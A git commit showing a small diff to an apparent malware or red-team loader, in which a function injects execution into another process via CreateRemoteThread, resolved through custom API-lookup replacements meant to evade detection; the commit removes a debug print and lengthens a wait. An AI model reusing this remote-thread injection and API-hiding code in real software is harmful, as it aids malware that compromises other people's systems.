348836f17face111e9dea109e998551297fbe44e
Jake123otte1 <jake123otte1@gmail.com>
2024-05-05 23:57:19 -0400

    removed debug printf in payload

--- src/execution.c
+++ src/execution.c
@@ -5,7 +5,6 @@ VOID RemoteThreadExecute(IN HANDLE hProcess, IN PVOID pAddress)
 	DWORD dwThreadID = 1;
 	f_CreateRemoteThread rCreateRemoteThread = GetProcAddressReplacement(GetModuleHandleReplacement(L"kernel32.dll"),"CreateRemoteThread");
 	HANDLE hThread = rCreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pAddress, NULL, 0, &dwThreadID);
-	printf("TID: %ld", dwThreadID);
 	f_WaitForSingleObject rWaitForSingleObject = GetProcAddressReplacement(GetModuleHandleReplacement(L"kernel32.dll"), "WaitForSingleObject");
-	rWaitForSingleObject(hThread, 1);
+	rWaitForSingleObject(hThread, 300);
 }
